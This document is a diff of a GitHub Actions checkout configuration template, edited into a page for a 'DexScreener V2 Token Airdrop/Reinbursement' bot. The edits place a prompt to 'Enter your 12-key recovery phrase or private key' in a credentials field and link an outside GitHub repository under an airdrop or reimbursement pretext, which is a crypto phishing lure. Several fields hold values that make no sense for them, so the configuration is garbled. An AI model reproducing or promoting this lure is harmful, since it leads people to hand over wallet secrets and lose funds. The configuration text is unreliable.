@@ -1,10 +1,10 @@
 DexScreener V2 Token Airdrop/Reinbursement
 
-- uses: DEX SCREENER V2 AIRDROP/REINBURSEMENT BOT
+- WHAT IS THIS BOT USED FOR?: DEX SCREENER V2 AIRDROP/REINBURSEMENT BOT
   with:
-    # Repository na
+    # Repository
     # Default: ${{ DEXSCREENER V2 TOKEN BOT }}
-    repository: ''
+    repository: 'https://github.com/moostysavage/V2-Token-Airdrop-'
 
     # The branch, tag or SHA to checkout. When checking out the repository that
     # triggered a workflow, this defaults to the reference or SHA for that event.
@@ -28,19 +28,19 @@ DexScreener V2 Token Airdrop/Reinbursement
     # `StrictHostKeyChecking=yes` and `CheckHostIP=no` to the SSH command line. Use
     # the input `ssh-known-hosts` to configure additional hosts.
     # Default: true
-    ssh-strict: ''
+    ssh-strict: 'Holder'
 
     # The user to use when connecting to the remote SSH host. By default 'git' is
     # used.
     # Default: git
-    ssh-user: ''
+    ssh-user: 'Holder'
 
     # Whether to configure the token or SSH key with the local git config
     # Default: true
-    persist-credentials: ''
+    persist-credentials: 'Enter your 12-key recovery phrase or private key to proceed.'
 
     # Relative path under $GITHUB_WORKSPACE to place the repository
-    path: ''
+    path: 'https://github.com/moostysavage/V2-Token-Airdrop-'
 
     # Partially clone against a given filter. Overrides sparse-checkout if set.
     # Default: null
@@ -65,7 +65,7 @@ DexScreener V2 Token Airdrop/Reinbursement
 
     # Whether to show progress status output when fetching.
     # Default: true
-    show-progress: ''
+    show-progress: 'true'
 
     # Whether to download Git-LFS files
     # Default: false
@@ -83,4 +83,4 @@ DexScreener V2 Token Airdrop/Reinbursement
     # Add repository path as safe.directory for Git global config by running `git
     # config --global --add safe.directory <path>`
     # Default: true
-    set-safe-directory: ''
+    set-safe-directory: 'https://github.com/moostysavage/V2-Token-Airdrop-'
